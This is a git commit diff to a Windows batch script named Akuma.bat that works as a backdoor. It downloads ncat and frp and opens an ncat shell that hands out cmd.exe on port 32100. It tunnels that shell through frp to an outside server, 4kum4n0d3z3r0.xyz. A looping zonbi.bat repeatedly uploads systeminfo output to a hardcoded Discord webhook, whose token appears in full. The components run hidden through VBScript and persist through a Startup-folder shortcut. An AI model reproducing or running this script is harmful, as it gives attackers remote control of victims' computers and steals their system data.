57d69ecdc473f289651c74adf08a82982a3b8a74
l_ <112792604+l-urk@users.noreply.github.com>
2023-10-16 08:00:27 -0700

    Update Akuma.bat

--- Akuma.bat
+++ Akuma.bat
@@ -7,10 +7,12 @@ curl -O https://nmap.org/dist/ncat-portable-5.59BETA1.zip
 curl -O https://github.com/fatedier/frp/releases/download/v0.52.1/frp_0.52.1_windows_amd64.zip
 tar -xf ncat-portable-5.59BETA1.zip
 tar -xf frp_0.52.1_windows_amd64.zip
+echo :start >> %homedrive%\Akuma\zonbi.bat
+echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
+echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
+echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=bot" https://discord.com/api/webhooks/1163478530538082437/riroyuxV8prESa8RqsYDxyLGPqksgCDMyGMwvuNxOyXkC8fzIgkvvpCUdzMU6Xlgj6Ht >> %homedrive%\Akuma\zonbi.bat
+echo goto start >> %homedrive%\Akuma\zonbi.bat
 echo :start >> %homedrive%\Akuma\ncat.bat
-echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\ncat.bat
-echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\ncat.bat
-echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=bot" https://discord.com/api/webhooks/1163478530538082437/riroyuxV8prESa8RqsYDxyLGPqksgCDMyGMwvuNxOyXkC8fzIgkvvpCUdzMU6Xlgj6Ht >> %homedrive%\Akuma\ncat.bat
 echo %homedrive%\Akuma\ncat-portable-5.59BETA1\ncat.exe -lvp 32100 -e cmd.exe >> %homedrive%\Akuma\ncat.bat
 echo goto start >> %homedrive%\Akuma\ncat.bat
 echo serverAddr = "4kum4n0d3z3r0.xyz" >> %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.ini
@@ -21,5 +23,6 @@ echo goto start >> %homedrive%\Akuma\frpc.bat
 echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\ncat.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\frpc.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
+echo objShell.Run "%homedrive%\Akuma\zonbi.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
 start %homedrive%\Akuma\Akuma.vbs
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
